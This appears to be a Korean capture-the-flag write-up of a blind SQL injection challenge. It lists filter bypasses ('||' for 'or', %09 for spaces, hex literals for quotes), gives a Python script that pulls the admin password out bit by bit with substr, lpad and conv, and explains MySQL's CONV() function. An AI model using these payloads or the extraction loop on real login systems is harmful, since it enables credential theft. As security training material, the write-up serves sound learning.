# 문제

- 블라인드 인젝션 문제이다.
- no, id, pw를 입력받는다
- 로그인 성공시 successful 페이지로 이동된다.
  - 실패시 failure 페이지로 이동된다.
- 몇가지 필터가 걸려있다.




#  풀이

- admin으로 로그인하면 될것같다.
- 필터링 되는것을 찾자
  - `or`
    - `||`로 우회
  - 띄어쓰기
    - `%09`로 우회
  - 싱글쿼터 - 시도 안해봤는데 막혀있을것 같다.
    - 헥스값으로 우회

- admin으로 로그인시 password를 입력하는 페이지가 나온다.


- 새롭게 알게된 efficient sql injection 방식으로 코딩했다.

  ```python
  while True:
      words = ''
      for idx in range(7):
          payload = '999||id\tlike\t'+'0x'+'admin'.encode('hex')
          payload += '&&substr(lpad(conv(hex(substr(pw,{0},1)),16,2),7,0),{1},1)=1'.format(len(flags)+1, idx+1)
  
          print 'payload: ' + payload
          params = {'no': payload, 'id': '123', 'pw': 'asdf'}
          res = requests.get(url+page, params = params, cookies=cookies)
          if res.text.find('Failure')!=-1:
              words += '0'
          else:
              words += '1'
  
      print 'founded words'
      print 'bin: ' + words
      print 'int: ' + str(int(words,2))
      ch = chr(int(words,2))
      print 'chr: ' + ch
      if ch == '\00':
          break
      else:
          flags += ch
  print '------------'
  print '------------'
  print '------------'
  print 'founded flags successfully...'
  print 'flags: ' + flags
  ```

  


# 알게된 것

### CONV() in sql

- 아무 진법의 수를 원하는 진법의 수로 바꿔준다.

- 실사용 예

  - `conv('a', 16, 2)`

    - `'a'`는 `ord`로 변환해주지 않는 이상 16진수인 61로 반환이 된다.
    - 따라서 2진수로 변환해주고 싶을 때 위처럼 `conv`를 이용해야 한다.

  - 같은 10진수 숫자를 10진수, 2진수로 변환

    ```mysql
    mysql> select conv('10101', 10, 10);
    +-----------------------+
    | conv('10101', 10, 10) |
    +-----------------------+
    | 10101                 |
    +-----------------------+
    1 row in set (0.00 sec)
    
    mysql> select conv('10101', 10, 2);
    +----------------------+
    | conv('10101', 10, 2) |
    +----------------------+
    | 10011101110101       |
    +----------------------+
    1 row in set (0.00 sec)
    ```

- `or` 키워드가 막혀있을 경우 `ord` 함수도 안된다..ㅠㅠ
  - 이때 conv를 사용하면 유용하다.
